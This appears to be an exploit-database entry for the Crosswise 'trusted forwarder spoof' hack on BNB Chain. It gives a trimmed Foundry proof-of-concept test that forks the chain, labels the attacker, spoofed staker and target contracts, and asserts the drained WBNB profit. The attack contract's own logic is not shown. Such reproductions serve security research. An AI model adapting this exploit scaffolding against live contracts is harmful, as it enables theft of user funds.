# [?] Crosswise - Trusted Forwarder Spoof

## Summary
Severity: Unknown
Chain: BNB Chain
Component: crosswise
Published: 2025-05-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/crosswise_exp.sol
Type: defi-exploit-poc

## Details
Lost: 4.16 WBNB

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("bsc", 49_186_830);

        fundingToken = WBNB_TOKEN;
        attacker = address(this);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(MASTER_CHEF, "Crosswise MasterChef");
        vm.label(CRSS_TOKEN, "CRSS");
        vm.label(CRSS_WBNB_PAIR, "CRSS/WBNB Pair");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(SPOOFED_STAKER, "Spoofed Staker");
    }

    function testExploit() public balanceLog {
        assertEq(ICrosswisePairLike(CRSS_WBNB_PAIR).token0(), CRSS_TOKEN);
        assertEq(ICrosswisePairLike(CRSS_WBNB_PAIR).token1(), WBNB_TOKEN);
        assertEq(ICrosswiseMasterChef(MASTER_CHEF).trustedForwarder(), 0xCC6B00b966b0A903e1F73cbCd845A8618c9603Ba);

        uint256 stakerBalance = ICrssToken(CRSS_TOKEN).balanceOf(SPOOFED_STAKER);
        assertEq(stakerBalance, 10_320_972_557_081_805_631_006_556);
        assertGe(ICrssToken(CRSS_TOKEN).allowance(SPOOFED_STAKER, MASTER_CHEF), stakerBalance);

        (, uint112 wbnbReserveBefore,) = ICrosswisePairLike(CRSS_WBNB_PAIR).getReserves();
        assertEq(uint256(wbnbReserveBefore), 9_771_726_308_878_491_704);

        new CrosswiseTrustedForwarderAttack(address(this));

        uint256 profit = IWBNBLike(WBNB_TOKEN).balanceOf(address(this));
        assertEq(profit, 4_158_211_071_044_910_965);
        assertEq(IWBNBLike(WBNB_TOKEN).balanceOf(CRSS_WBNB_PAIR), 5_613_515_237_833_580_739);
    }
}
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/crosswise_exp.sol_
